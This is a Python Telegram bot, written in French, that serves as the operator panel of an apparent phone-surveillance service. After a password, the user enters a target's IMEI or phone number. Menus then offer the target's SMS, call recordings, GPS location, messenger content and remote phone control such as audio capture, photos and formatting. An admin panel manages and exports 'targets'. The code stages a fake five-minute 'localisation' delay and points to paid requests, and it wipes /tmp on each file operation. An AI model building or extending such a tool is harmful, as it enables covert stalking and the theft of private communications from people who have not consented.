import os
import logging
import asyncio
import shutil
from datetime import datetime
from telegram import Update, ReplyKeyboardMarkup, ReplyKeyboardRemove
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    ContextTypes,
    ConversationHandler,
    filters
)
import database
import file_manager
import report_generator
from config import BOT_TOKEN, ADMIN_IDS, DATA_PATH, DB_NAME, BOT_PASSWORD

# Initialisation de la base de données
database.init_db(DB_NAME)

# Configuration des états de conversation
PASSWORD, MAIN_MENU, CATEGORY_SELECTION, SUBCATEGORY_SELECTION, FILE_OPERATION = range(5)

# Configurez le logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.DEBUG
)
logger = logging.getLogger(__name__)
file_handler = logging.FileHandler('bot.log')
file_handler.setLevel(logging.DEBUG)
file_handler.setFormatter(logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s'))
logger.addHandler(file_handler)

# Structure complète du menu
MENU_STRUCTURE = {
    "📱 SMS/MMS": {
        "folder": "sms_mms",
        "submenu": [
            "Suivi des SMS et MMS",
            "Alerte SMS"
        ]
    },
    "📞 Appels": {
        "folder": "appels",
        "submenu": [
            "Suivi des journaux d'appels",
            "Enregistrement des appels",
            "Blocage des appels"
        ]
    },
    "📍 Localisation": {
        "folder": "localisations",
        "submenu": [
            "Historique des positions GPS",
            "Suivi en temps réel"
        ]
    },
    "🖼️ Photos & Vidéos": {
        "folder": "photos",
        "submenu": [
            "Visualiser les photos et images"
        ]
    },
    "💬 Messagerie instantanée": {
        "folder": "messageries",
        "submenu": [
            "WhatsApp", "Facebook Messenger", "Skype", "Hangouts", "LINE",
            "Kik", "Viber", "Gmail", "Tango", "Snapchat", "Telegram"
        ]
    },
    "🎙️ Contrôle à distance": {
        "folder": "controle_distance",
        "submenu": [
            "Enregistrement audio",
            "Prendre une photo",
            "Commande SMS",
            "Faire vibrer/sonner",
            "Envoyer message vocal",
            "Envoyer popup texte",
            "Envoyer SMS externe",
            "Position GPS",
            "Capture d'écran",
            "Récupérer données",
            "Info téléphone",
            "Cacher/Voir icône",
            "Activer/Désactiver Wi-Fi",
            "Redémarrer téléphone",
            "Formater téléphone",
            "Bloquer téléphone"
        ]
    },
    "📺 Visualisation en direct": {
        "folder": "visualisation_directe",
        "submenu": [
            "Audio/Vidéo/Screen"
        ]
    },
    "📁 Gestionnaire de fichiers": {
        "folder": "fichiers",
        "submenu": [
            "Explorateur de fichiers"
        ]
    },
    "⏱ Restriction d'horaire": {
        "folder": "restrictions",
        "submenu": [
            "Restreindre utilisation"
        ]
    },
    "📱 Applications": {
        "folder": "applications",
        "submenu": [
            "Suivi applications installées",
            "Blocage des applications"
        ]
    },
    "🌐 Sites Web": {
        "folder": "sites_web",
        "submenu": [
            "Historique des sites",
            "Blocage des sites"
        ]
    },
    "📅 Calendrier": {
        "folder": "calendrier",
        "submenu": [
            "Historique des événements"
        ]
    },
    "👤 Contacts": {
        "folder": "contacts",
        "submenu": [
            "Suivi des nouveaux contacts"
        ]
    },
    "📊 Outils d'analyse": {
        "folder": "analyse",
        "submenu": [
            "Statistiques",
            "Rapport PDF/Excel/CSV"
        ]
    }
}

# Claviers réutilisables
def get_main_category_keyboard():
    return [
        ["📱 SMS/MMS", "📞 Appels", "📍 Localisation"],
        ["🖼️ Photos & Vidéos", "💬 Messagerie instantanée", "🎙️ Contrôle à distance"],
        ["📺 Visualisation en direct", "📁 Gestionnaire de fichiers", "⏱ Restriction d'horaire"],
        ["📱 Applications", "🌐 Sites Web", "📅 Calendrier"],
        ["👤 Contacts", "📊 Outils d'analyse", "📋 Retour"]
    ]

def get_admin_keyboard():
    return [
        ["📋 Liste des cibles", "🗑️ Supprimer une cible"],
        ["📈 Statistiques", "📤 Exporter les logs"],
        ["📊 Tableau de bord", "⬅️ Retour au menu principal"]
    ]

async def check_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Vérifie le mot de passe de l'utilisateur"""
    user_input = update.message.text.strip()
    user_id = update.effective_user.id
    
    if user_input == BOT_PASSWORD:
        database.log_user_access(DB_NAME, user_id, "LOGIN_SUCCESS")
        await update.message.reply_text(
            "✅ Accès autorisé. Entrez un IMEI, numéro de série (SN) ou numéro de téléphone (format international).",
            reply_markup=ReplyKeyboardRemove()
        )
        return MAIN_MENU
    else:
        database.log_user_access(DB_NAME, user_id, "LOGIN_FAILED")
        await update.message.reply_text(
            "❌ Mot de passe incorrect. Veuillez réessayer ou contactez l'admin (@NouveauContactAdmin).",
            reply_markup=ReplyKeyboardRemove()
        )
        return PASSWORD

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Démarre ou réinitialise la conversation"""
    context.user_data.clear()
    await update.message.reply_text(
        "🔐 Veuillez entrer le mot de passe pour accéder au bot.",
        reply_markup=ReplyKeyboardRemove()
    )
    return PASSWORD

async def handle_device_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gère la saisie de l'identifiant de l'appareil"""
    try:
        user_input = update.message.text.strip()
        user_id = update.effective_user.id
        
        # Commande spéciale de réinitialisation
        if user_input.lower() == "/reset":
            return await start(update, context)
        
        if file_manager.validate_device_id(user_input):
            # Vérifier si le dossier existe déjà sur MEGA
            device_exists = user_input in file_manager.list_devices(DATA_PATH)
            
            # Enregistrer l'accès utilisateur
            database.log_user_access(DB_NAME, user_id, f"DEVICE_ACCESS:{user_input}")
            
            context.user_data['current_device'] = user_input
            database.add_device(DB_NAME, user_input, "unknown")
            
            if not device_exists:
                # Message d'attente pour les nouveaux appareils
                wait_message = await update.message.reply_text(
                    f"⌛ Veuillez patienter le temps que nous localisons le numéro {user_input}...\n"
                    "⚠️ Les requêtes sont payantes, veuillez contacter l'admin (@NouveauContactAdmin)."
                )
                # Créer le dossier sur MEGA
                file_manager.create_device_folder(user_input)
                
                # Planifier la suppression du message, l'envoi du message de confirmation et l'affichage du menu
                async def handle_wait_message():
                    await asyncio.sleep(300)  # Attendre 5 minutes
                    try:
                        await context.bot.delete_message(
                            chat_id=update.effective_chat.id,
                            message_id=wait_message.message_id
                        )
                    except Exception as e:
                        logger.warning(f"Impossible de supprimer le message d'attente: {str(e)}")
                    try:
                        await context.bot.send_message(
                            chat_id=update.effective_chat.id,
                            text="✅ Localisation terminée. La disponibilité des données est fonction du volume d’informations traitées, de la disponibilité d’Internet et de l’appareil de la cible."
                        )
                        keyboard = get_main_category_keyboard()
                        reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True, one_time_keyboard=False)
                        await context.bot.send_message(
                            chat_id=update.effective_chat.id,
                            text=f"✅ Dossier créé pour : {user_input}\nSélectionnez une catégorie :",
                            reply_markup=reply_markup
                        )
                    except Exception as e:
                        logger.error(f"Erreur lors de l'envoi du message de confirmation ou du menu: {str(e)}")
                
                # Lancer la tâche asynchrone sans bloquer
                asyncio.create_task(handle_wait_message())
                return CATEGORY_SELECTION  # Retourner immédiatement pour permettre d'autres interactions
            
            # Pour les appareils existants, afficher le menu directement
            keyboard = get_main_category_keyboard()
            reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True, one_time_keyboard=False)
            
            await update.message.reply_text(
                f"✅ Dossier créé pour : {user_input}\nSélectionnez une catégorie :",
                reply_markup=reply_markup
            )
            return CATEGORY_SELECTION
        else:
            await update.message.reply_text(
                "❌ Format invalide. Veuillez entrer un IMEI (15 chiffres), SN (alphanumérique) ou numéro international (ex: +33612345678)."
                "\n\n⚠️ Utilisez /start pour réessayer."
            )
            return MAIN_MENU
    except Exception as e:
        logger.error(f"Erreur dans handle_device_id: {str(e)}")
        await update.message.reply_text("❌ Erreur critique. Utilisez /start pour réinitialiser.")
        return ConversationHandler.END

async def handle_category_selection(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gère la sélection de catégorie principale"""
    try:
        category = update.message.text
        device_id = context.user_data.get('current_device')
        
        if not device_id:
            await update.message.reply_text("❌ Session expirée. Utilisez /start pour recommencer.")
            return PASSWORD
        
        # Gestion des commandes admin
        if category == "📋 Liste des cibles":
            return await list_targets(update, context)
        elif category == "🗑️ Supprimer une cible":
            await update.message.reply_text("Entrez /delete_target suivi de l'ID de la cible à supprimer")
            return CATEGORY_SELECTION
        elif category == "📈 Statistiques":
            await update.message.reply_text("Entrez /stats_target suivi de l'ID de la cible")
            return CATEGORY_SELECTION
        elif category == "📤 Exporter les logs":
            await update.message.reply_text("Entrez /export suivi de l'ID de la cible et du format (csv ou pdf)")
            return CATEGORY_SELECTION
        elif category == "📊 Tableau de bord":
            return await show_dashboard(update, context)
        elif category == "⬅️ Retour au menu principal":
            return await start(update, context)
        
        # Gestion du retour
        if category == "📋 Retour":
            await update.message.reply_text(
                "🔍 Entrez un nouvel identifiant (IMEI, SN ou numéro) :",
                reply_markup=ReplyKeyboardRemove()
            )
            return MAIN_MENU
        
        # Vérifier si la catégorie existe dans la structure
        if category in MENU_STRUCTURE:
            context.user_data['current_main_category'] = category
            main_category = MENU_STRUCTURE[category]
            
            submenu = main_category.get('submenu', [])
            if submenu:
                submenu_keyboard = []
                for i in range(0, len(submenu), 2):
                    submenu_keyboard.append(submenu[i:i+2])
                submenu_keyboard.append(["⬅️ Retour aux catégories"])
                
                reply_markup = ReplyKeyboardMarkup(submenu_keyboard, resize_keyboard=True)
                
                await update.message.reply_text(
                    f"🔽 Sous-catégories pour {category} :",
                    reply_markup=reply_markup
                )
                return SUBCATEGORY_SELECTION
            else:
                return await handle_subcategory_selection(update, context, category, None)
        else:
            keyboard = get_main_category_keyboard()
            reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
            await update.message.reply_text(
                "❌ Catégorie non reconnue. Veuillez choisir une option valide :",
                reply_markup=reply_markup
            )
            return CATEGORY_SELECTION
    
    except Exception as e:
        logger.error(f"Erreur dans handle_category_selection: {str(e)}")
        await update.message.reply_text("❌ Erreur critique. Utilisez /start pour réinitialiser.")
        return ConversationHandler.END

async def handle_subcategory_selection(update: Update, context: ContextTypes.DEFAULT_TYPE, subcategory=None):
    """Gère la sélection de sous-catégorie"""
    try:
        if not subcategory:
            subcategory = update.message.text
        
        device_id = context.user_data.get('current_device')
        main_category = context.user_data.get('current_main_category')
        
        if not device_id or not main_category:
            await update.message.reply_text("❌ Session expirée. Utilisez /start pour recommencer.")
            return PASSWORD
            
        if subcategory == "⬅️ Retour aux catégories":
            return await return_to_categories(update, context)
        
        main_category_data = MENU_STRUCTURE.get(main_category)
        if not main_category_data or subcategory not in main_category_data.get('submenu', []):
            await update.message.reply_text("❌ Sous-catégorie non valide. Veuillez réessayer.")
            return SUBCATEGORY_SELECTION
        
        main_folder = main_category_data['folder']
        subfolder_name = "".join(filter(str.isalnum, subcategory)).lower()[:20]
        category_path = os.path.join(DATA_PATH, device_id, main_folder, subfolder_name)
        
        # Créer le dossier sur MEGA
        file_manager.create_folder(category_path)
        
        context.user_data['current_category'] = category_path
        context.user_data['current_subcategory'] = subcategory
        
        files = file_manager.list_files(category_path)
        
        if files:
            file_keyboard = [[f] for f in files]
            file_keyboard.append(["⬅️ Retour aux catégories", "⬆️ Télécharger un fichier"])
            reply_markup = ReplyKeyboardMarkup(file_keyboard, resize_keyboard=True)
            
            await update.message.reply_text(
                f"📂 Fichiers disponibles dans {subcategory}:\n"
                "Sélectionnez un fichier pour le visualiser ou téléchargez-en un nouveau.",
                reply_markup=reply_markup
            )
        else:
            reply_markup = ReplyKeyboardMarkup([["⬅️ Retour aux catégories", "⬆️ Télécharger un fichier"]], resize_keyboard=True)
            await update.message.reply_text(
                f"ℹ️ Aucun fichier dans {subcategory}.\n"
                "Vous pouvez télécharger un fichier avec le bouton ci-dessous.",
                reply_markup=reply_markup
            )
        
        return FILE_OPERATION
    
    except Exception as e:
        logger.error(f"Erreur dans handle_subcategory_selection: {str(e)}")
        await update.message.reply_text("❌ Erreur critique. Utilisez /start pour réinitialiser.")
        return ConversationHandler.END

async def handle_file_operation(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gère les opérations sur les fichiers dans une catégorie sur MEGA"""
    try:
        user_choice = update.message.text
        device_id = context.user_data.get('current_device')
        category_path = context.user_data.get('current_category')
        
        if not device_id or not category_path:
            await update.message.reply_text("❌ Session expirée. Utilisez /start pour recommencer.")
            return PASSWORD
            
        if user_choice == "⬅️ Retour aux catégories":
            return await return_to_categories(update, context)
        
        elif user_choice == "⬆️ Télécharger un fichier":
            await update.message.reply_text(
                "⬆️ Envoyez le fichier que vous souhaitez télécharger dans cette catégorie.",
                reply_markup=ReplyKeyboardRemove()
            )
            return FILE_OPERATION
        
        else:
            file_path = os.path.join(category_path, user_choice)
            
            # Nettoyer le répertoire temporaire
            shutil.rmtree('/tmp', ignore_errors=True)
            os.makedirs('/tmp', exist_ok=True)
            
            # Télécharger le fichier depuis MEGA temporairement
            temp_file_path = os.path.join('/tmp', user_choice)
            try:
                if file_manager.download_file(file_path, temp_file_path):
                    file_manager.log_activity(DB_NAME, device_id, "CONSULT", file_path)
                    
                    await context.bot.send_document(
                        chat_id=update.effective_chat.id,
                        document=open(temp_file_path, 'rb'),
                        filename=user_choice
                    )
                    
                    # Supprimer le fichier temporaire
                    if os.path.exists(temp_file_path):
                        os.remove(temp_file_path)
                    
                    files = file_manager.list_files(category_path)
                    file_keyboard = [[f] for f in files]
                    file_keyboard.append(["⬅️ Retour aux catégories", "⬆️ Télécharger un fichier"])
                    reply_markup = ReplyKeyboardMarkup(file_keyboard, resize_keyboard=True)
                    
                    await update.message.reply_text(
                        "Sélectionnez une autre action:",
                        reply_markup=reply_markup
                    )
                else:
                    await update.message.reply_text("❌ Fichier introuvable sur MEGA.")
            except Exception as e:
                logger.error(f"Erreur lors du téléchargement du fichier {file_path}: {str(e)}")
                await update.message.reply_text(f"❌ Erreur lors de la récupération du fichier: {str(e)}")
            
            return FILE_OPERATION
    
    except Exception as e:
        logger.error(f"Erreur dans handle_file_operation: {str(e)}")
        await update.message.reply_text("❌ Erreur critique. Utilisez /start pour réinitialiser.")
        return ConversationHandler.END

async def handle_file_upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gère le téléchargement de fichiers dans une catégorie sur MEGA"""
    try:
        device_id = context.user_data.get('current_device')
        category_path = context.user_data.get('current_category')
        
        if not device_id or not category_path:
            await update.message.reply_text("❌ Session expirée. Utilisez /start pour recommencer.")
            return PASSWORD
            
        if update.message.document:
            file = await context.bot.get_file(update.message.document.file_id)
            file_name = update.message.document.file_name
            
            # Nettoyer le répertoire temporaire
            shutil.rmtree('/tmp', ignore_errors=True)
            os.makedirs('/tmp', exist_ok=True)
            
            # Télécharger temporairement le fichier localement
            temp_file_path = os.path.join('/tmp', file_name)
            await file.download_to_drive(temp_file_path)
            
            # Enregistrer le fichier sur MEGA
            file_path = os.path.join(category_path, file_name)
            if file_manager.upload_file(file_path, temp_file_path):
                file_manager.log_activity(DB_NAME, device_id, "UPLOAD", file_path)
                
                await update.message.reply_text(f"✅ Fichier {file_name} téléchargé avec succès sur MEGA.")
                
                # Supprimer le fichier temporaire
                if os.path.exists(temp_file_path):
                    os.remove(temp_file_path)
                
                return await return_to_categories(update, context)
            else:
                await update.message.reply_text("❌ Échec de l'upload du fichier sur MEGA.")
                if os.path.exists(temp_file_path):
                    os.remove(temp_file_path)
                return FILE_OPERATION
        
        await update.message.reply_text("❌ Format de fichier non reconnu. Veuillez envoyer un document.")
        return FILE_OPERATION
    
    except Exception as e:
        logger.error(f"Erreur dans handle_file_upload: {str(e)}")
        await update.message.reply_text("❌ Erreur critique. Utilisez /start pour réinitialiser.")
        return ConversationHandler.END

async def admin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Affiche le panel d'administration"""
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("❌ Accès refusé.")
        return
    
    keyboard = get_admin_keyboard()
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    
    await update.message.reply_text(
        "🛠️ Panel Admin - Sélectionnez une option:",
        reply_markup=reply_markup
    )
    return CATEGORY_SELECTION

async def list_targets(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Affiche la liste des cibles enregistrées"""
    targets = file_manager.list_devices(DATA_PATH)
    
    if targets:
        response = "📋 Cibles enregistrées:\n" + "\n".join([f"- {t}" for t in targets])
    else:
        response = "ℹ️ Aucune cible enregistrée."
    
    await update.message.reply_text(response)
    
    keyboard = get_admin_keyboard()
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    await update.message.reply_text(
        "Sélectionnez une autre option:",
        reply_markup=reply_markup
    )
    return CATEGORY_SELECTION

async def delete_target(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Supprime une cible spécifique"""
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("❌ Accès refusé.")
        return
    
    if not context.args:
        await update.message.reply_text("Usage: /delete_target <id>")
        return
    
    target_id = context.args[0]
    if file_manager.delete_device_folder(target_id):
        database.delete_device(DB_NAME, target_id)
        await update.message.reply_text(f"✅ Cible {target_id} supprimée.")
    else:
        await update.message.reply_text(f"❌ Erreur lors de la suppression de {target_id}.")
    
    keyboard = get_admin_keyboard()
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    await update.message.reply_text(
        "Sélectionnez une autre option:",
        reply_markup=reply_markup
    )
    return CATEGORY_SELECTION

async def export_logs(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Exporte les logs d'une cible spécifique"""
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("❌ Accès refusé.")
        return
    
    if not context.args:
        await update.message.reply_text("Usage: /export <id> [csv|pdf]")
        return
    
    target_id = context.args[0]
    format_type = context.args[1] if len(context.args) > 1 else "csv"
    
    try:
        if format_type == "csv":
            filename = report_generator.generate_csv(DB_NAME, target_id)
            await context.bot.send_document(
                chat_id=update.effective_chat.id,
                document=open(filename, 'rb'),
                filename=f"{target_id}_logs.csv"
            )
            os.remove(filename)
        elif format_type == "pdf":
            filename = report_generator.generate_pdf(DB_NAME, target_id)
            await context.bot.send_document(
                chat_id=update.effective_chat.id,
                document=open(filename, 'rb'),
                filename=f"{target_id}_report.pdf"
            )
            os.remove(filename)
        else:
            await update.message.reply_text("❌ Format non supporté. Utilisez 'csv' ou 'pdf'.")
            return
    except Exception as e:
        logger.error(f"Erreur lors de l'export: {str(e)}")
        await update.message.reply_text("❌ Erreur lors de la génération du rapport.")
    
    keyboard = get_admin_keyboard()
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    await update.message.reply_text(
        "Sélectionnez une autre option:",
        reply_markup=reply_markup
    )
    return CATEGORY_SELECTION

async def show_dashboard(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Affiche le tableau de bord admin"""
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("❌ Accès refusé.")
        return
    
    dashboard_text = report_generator.generate_dashboard(DB_NAME)
    await update.message.reply_text(dashboard_text)
    
    keyboard = get_admin_keyboard()
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    await update.message.reply_text(
        "Sélectionnez une autre option:",
        reply_markup=reply_markup
    )
    return CATEGORY_SELECTION

async def return_to_categories(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Fonction utilitaire pour retourner au menu des catégories"""
    device_id = context.user_data.get('current_device')
    keyboard = get_main_category_keyboard()
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    await update.message.reply_text(
        f"Retour au menu des catégories pour {device_id}:",
        reply_markup=reply_markup
    )
    return CATEGORY_SELECTION

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Annule la conversation et réinitialise complètement"""
    context.user_data.clear()
    await update.message.reply_text(
        "✅ Opération annulée. Tapez /start pour recommencer.",
        reply_markup=ReplyKeyboardRemove()
    )
    return ConversationHandler.END

async def reset_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Commande de réinitialisation explicite"""
    return await start(update, context)

async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
    """Gère les erreurs de manière robuste"""
    logger.error("Exception lors de la mise à jour du bot:", exc_info=context.error)
    
    if update and isinstance(update, Update):
        try:
            await update.message.reply_text(
                "❌ Une erreur critique s'est produite. "
                "Veuillez utiliser /start pour réinitialiser le bot.\n\n"
                f"Erreur: {str(context.error)[:200]}"
            )
        except:
            logger.error("Échec d'envoi du message d'erreur")
    
    return ConversationHandler.END

def run_bot():
    """Démarre le bot avec une gestion robuste"""
    application = ApplicationBuilder().token(BOT_TOKEN).build()
    
    application.add_handler(CommandHandler('reset', reset_command))
    
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler('start', start)],
        states={
            PASSWORD: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, check_password)
            ],
            MAIN_MENU: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_device_id)
            ],
            CATEGORY_SELECTION: [
                MessageHandler(filters.Regex(r'^(📋 Liste des cibles|🗑️ Supprimer une cible|📈 Statistiques|📤 Exporter les logs|📊 Tableau de bord|⬅️ Retour au menu principal)$'), admin_command),
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_category_selection)
            ],
            SUBCATEGORY_SELECTION: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_subcategory_selection)
            ],
            FILE_OPERATION: [
                MessageHandler(filters.Document.ALL, handle_file_upload),
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_file_operation)
            ]
        },
        fallbacks=[
            CommandHandler('cancel', cancel),
            CommandHandler('start', start),
            CommandHandler('reset', reset_command)
        ]
    )
    
    application.add_handler(CommandHandler('admin', admin_command))
    application.add_handler(CommandHandler('delete_target', delete_target))
    application.add_handler(CommandHandler('export', export_logs))
    application.add_handler(CommandHandler('dashboard', show_dashboard))
    application.add_handler(CommandHandler('stats_target', lambda u, c: u.message.reply_text("Fonctionnalité en développement")))
    application.add_handler(conv_handler)
    
    application.add_error_handler(error_handler)
    
    logger.info("Bot démarré avec succès!")
    application.run_polling()

if __name__ == '__main__':
    run_bot()
